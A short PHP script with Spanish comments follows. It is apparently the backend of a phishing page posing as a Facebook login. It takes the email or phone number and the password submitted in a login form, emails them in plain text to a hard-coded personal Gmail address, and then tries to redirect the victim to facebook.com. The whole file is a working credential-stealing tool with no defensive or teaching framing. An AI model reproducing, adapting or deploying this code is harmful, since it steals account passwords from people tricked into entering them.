<?php
// Verifica si se han enviado datos mediante el método POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtiene los datos del formulario
    $correo = $_POST["correo electrónico o numero de telefono"];
    $contrasena = $_POST["contrasena"];

    // Construye el mensaje de correo
    $mensaje = "Correo electrónico: " . $correo . "\n";
    $mensaje .= "Contraseña: " . $contrasena;

    // Dirección de correo a la que se enviará el mensaje
    $destinatario = "bryanleyva090@gmail.com";

    // Asunto del correo
    $asunto = "Nuevo formulario de inicio de sesión";

    // Cabeceras del correo
    $cabeceras = "From: bryanleyva090@gmail.com";

    // Envía el correo
    mail($destinatario, $asunto, $mensaje, $cabeceras);

    // Redirige a una página de confirmación
    header("https://www.facebook.com/");
} else {
    // Si no se envían datos por POST, muestra un mensaje de error o realiza alguna acción adicional
    echo "No se han recibido datos.";
}
?>

